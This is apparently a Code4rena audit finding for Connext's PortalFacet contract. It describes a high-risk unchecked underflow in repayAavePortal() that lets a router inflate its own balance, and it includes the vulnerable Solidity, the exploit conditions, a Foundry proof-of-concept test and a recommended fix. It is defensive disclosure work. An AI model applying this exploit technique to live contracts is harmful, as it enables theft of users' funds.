## Tags

- bug
- 3 (High Risk)
- resolved
- sponsor confirmed

# [`PortcalFacet.repayAavePortal()` can trigger an underflow of `routerBalances`](https://github.com/code-423n4/2022-06-connext-findings/issues/68) 

# Lines of code

https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L80-L113


# Vulnerability details

## Impact
The caller of `repayAavePortal()` can trigger an underflow to arbitrarily increase the caller's balance through an underflow.

## Proof of Concept
```sol
// Relevant code sections:

// PortalFacet.sol
  function repayAavePortal(
    address _local,
    uint256 _backingAmount,
    uint256 _feeAmount,
    uint256 _maxIn,
    bytes32 _transferId
  ) external {
    uint256 totalAmount = _backingAmount + _feeAmount; // in adopted
    uint256 routerBalance = s.routerBalances[msg.sender][_local]; // in local

    // Sanity check: has that much to spend
    if (routerBalance < _maxIn) revert PortalFacet__repayAavePortal_insufficientFunds();

    // Need to swap into adopted asset or asset that was backing the loan
    // The router will always be holding collateral in the local asset while the loaned asset
    // is the adopted asset

    // Swap for exact `totalRepayAmount` of adopted asset to repay aave
    (bool success, uint256 amountIn, address adopted) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(
      _local,
      totalAmount,
      _maxIn
    );

    if (!success) revert PortalFacet__repayAavePortal_swapFailed();

    // decrement router balances
    unchecked {
      s.routerBalances[msg.sender][_local] -= amountIn;
    }

    // back loan
    _backLoan(_local, _backingAmount, _feeAmount, _transferId);
  }

// AssetLogic.sol
  function swapFromLocalAssetIfNeededForExactOut(
    address _asset,
    uint256 _amount,
    uint256 _maxIn
  )
    internal
    returns (
      bool,
      uint256,
      address
    )
  {
    AppStorage storage s = LibConnextStorage.connextStorage();

    // Get the token id
    (, bytes32 id) = s.tokenRegistry.getTokenId(_asset);

    // If the adopted asset is the local asset, no need to swap
    address adopted = s.canonicalToAdopted[id];
    if (adopted == _asset) {
      return (true, _amount, _asset);
    }

    return _swapAssetOut(id, _asset, adopted, _amount, _maxIn);
  }
```
First, call `repayAavePortal()` where `_backingAmount + _feeAmount > s.routerBalances[msg.sender][_local] && _maxIn > s.routerBalances[msg.sender][_local]`. That will trigger the call to the AssetLogic contract:
```sol
    (bool success, uint256 amountIn, address adopted) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(
      _local,
      totalAmount,
      _maxIn
    );
```
By setting `_local` to the same value as the adopted asset, you trigger the following edge case:
```sol
    address adopted = s.canonicalToAdopted[id];
    if (adopted == _asset) {
      return (true, _amount, _asset);
    }
```
So the `amountIn` value returned by `swapFromLocalAssetIfNeededForExactOut()` is the `totalAmount` value that was passed to it. And `totalAmount == _backingAmount + _feeAmount`.

Meaning the `amountIn` value is user-specified for this edge case. Finally, we reach the following line:
```sol
    unchecked {
      s.routerBalances[msg.sender][_local] -= amountIn;
    }
```
`amountIn` (user-specified) is subtracted from the `routerBalances` in an `unchecked` block. Thus, the attacker is able to trigger an underflow and increase their balance arbitrarily high. The `repayAavePortal()` function only verifies that `routerBalance < _maxIn`.

Here's a test as PoC:
```sol
// PortalFacet.t.sol

  function test_PortalFacet_underflow() public {
    s.routerPermissionInfo.approvedForPortalRouters[router] = true;

    uint backing = 2 ether;
    uint fee = 10000;
    uint init = 1 ether;

    s.routerBalances[router][_local] = init;
    s.portalDebt[_id] = backing;
    s.portalFeeDebt[_id] = fee;

    vm.mockCall(s.aavePool, abi.encodeWithSelector(IAavePool.backUnbacked.selector), abi.encode(true));
    vm.prank(router);
    this.repayAavePortal(_local, backing, fee, init - 0.5 ether, _id);

    // balance > init => underflow
    require(s.routerBalances[router][_local] > init);
  }
```
## Tools Used
none

## Recommended Mitigation Steps
After the call to `swapFromLocalAssetIfNeededForExactOut()` you should add the following check:
```sol
if (_local == adopted) {
  require(routerBalance >= amountIn);
}
```

